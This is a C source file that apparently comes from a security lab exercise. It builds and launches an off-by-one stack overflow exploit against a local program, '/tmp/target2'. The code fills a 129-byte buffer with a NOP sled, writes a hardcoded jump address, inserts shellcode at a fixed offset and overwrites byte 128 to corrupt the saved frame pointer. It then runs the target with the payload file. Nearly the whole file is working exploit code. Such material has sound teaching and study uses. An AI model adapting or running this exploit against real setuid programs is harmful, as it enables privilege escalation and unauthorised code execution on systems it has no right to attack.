#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET_BIN_PATH "/tmp/target2"
#define PAYLOAD_OUTPUT_PATH "/tmp/xploit2_output" 

void assemble_exploit_data(char *payload, const size_t payload_len, u_int64_t jump_addr) {
    const size_t shell_len = sizeof(shellcode) - 1;
    const size_t addr_len = 8;
    
    // Initialize buffer with NOPs for sled
    memset(payload, 0x90, payload_len);

    const size_t addr_inject_offset = 24;
    for (size_t i = 0; i < addr_len; ++i) {
        payload[addr_inject_offset + i] = (char)((jump_addr >> (i * 8)) & 0xff);
    }

    // Place shellcode into NOP sled
    const size_t shellcode_inject_offset = 56;
    memcpy(payload + shellcode_inject_offset, shellcode, shell_len);
    
    // overwrite one byte at index 128 (buf[128]) with 0x40
    const size_t off_by_one_offset = 128;
    payload[off_by_one_offset] = 0x40; 
}

int main(int arg_count, char *arg_values[])
{
    // required size: buf[128] + 1 extra byte = 129 bytes
    const size_t total_payload_size = 129;
    char payload_data_buffer[total_payload_size];
    const u_int64_t target_address_for_jump = 0x7fffffffeb50; 

    assemble_exploit_data(payload_data_buffer, total_payload_size, target_address_for_jump);

    write_xploit(payload_data_buffer, sizeof(payload_data_buffer), PAYLOAD_OUTPUT_PATH);

    char *exec_arguments[] = { TARGET_BIN_PATH, PAYLOAD_OUTPUT_PATH, NULL };
    char *exec_environment[] = { NULL };
    execve(TARGET_BIN_PATH, exec_arguments, exec_environment);
    
    perror("Error during execve");
    fprintf(stderr, "Check permissions: execute \"sudo make install\"\n");

    return 0;
}
